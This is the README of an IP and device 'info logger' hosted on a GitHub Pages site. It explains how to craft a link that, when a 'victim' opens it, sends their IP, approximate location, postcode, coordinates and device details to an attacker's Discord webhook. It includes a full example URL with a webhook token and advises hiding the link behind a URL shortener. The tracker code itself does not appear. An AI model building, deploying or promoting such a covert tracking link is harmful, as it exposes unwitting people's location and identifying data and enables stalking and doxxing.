# Advanced Info Logger

## Usage
To create a URL, format it like this:

submits.github.io/?(user id of who you want to ping when url is clicked)?(id of webhook)?(token of webhook)?(message victim will see upon loading page)

Optionally, add ?mobile on the end of the url if you are targetting someone on mobile (this is because some info only supports desktop browsers).

## Example URL:
https://submits.github.io/?111111111111111111?000000000000000000?5GQxDgWlCxxIgKqNiOedfzv-dKI_lE0qxq5R4ZiBDngj619JdLiHkH6N2FPB1Vl2qDIw?an%20example%20logging%20message?mobile

*It is recommended you use a URL shortener.*

## Result

![Clicking on the link should produce this from your webhook.](https://i.imgur.com/jUfUiGx.png)

The webhook name will be randomised to avoid clutter, and the embed will contain the following:
• The URL the victim clicked  <br>
• IP
• Rough Area 
• Postcode
• Lat/Long of IP
• Browser
• Platform
• Screen Size
• Screen Rotation
• Batter Percentage
• Graphics Card Name/Driver
• Number of Logical Processors
• The message the victim will see
